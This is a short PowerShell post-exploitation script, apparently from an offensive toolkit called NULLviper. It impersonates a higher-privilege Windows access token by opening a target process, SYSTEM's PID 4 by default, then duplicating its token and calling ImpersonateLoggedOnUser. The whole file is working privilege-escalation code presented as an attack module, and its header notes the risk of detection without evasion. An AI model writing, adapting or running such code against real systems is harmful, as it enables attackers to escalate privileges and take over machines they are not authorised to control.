<#
.SYNOPSIS
    HBV2.0 - Access Token Impersonation
.DESCRIPTION
    Uses OpenProcessToken and DuplicateToken to impersonate higher-privilege users.
.NOTES
    Module: NULLviper, PostEx
    WARNING: High detection risk without evasion.
#>

param(
    [int]$TargetPID = 4  # Default to SYSTEM (usually PID 4)
)

Add-Type @"
using System;
using System.Runtime.InteropServices;

public class TokenOps {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool OpenProcessToken(IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool DuplicateToken(IntPtr existingToken, int impersonationLevel, out IntPtr duplicateToken);
    [DllImport("advapi32.dll", SetLastError = true)] public static extern bool ImpersonateLoggedOnUser(IntPtr tokenHandle);
}
"@

$processHandle = [TokenOps]::OpenProcess(0x0400, $false, $TargetPID)
if ($processHandle -eq [IntPtr]::Zero) {
    Write-Host "[X] Failed to open process $TargetPID" -ForegroundColor Red
    return
}

$tokenHandle = [IntPtr]::Zero
[TokenOps]::OpenProcessToken($processHandle, 0x0002, [ref]$tokenHandle) | Out-Null

$dupToken = [IntPtr]::Zero
[TokenOps]::DuplicateToken($tokenHandle, 2, [ref]$dupToken) | Out-Null

[TokenOps]::ImpersonateLoggedOnUser($dupToken) | Out-Null

Write-Host "[+] Token from PID $TargetPID impersonated." -ForegroundColor Green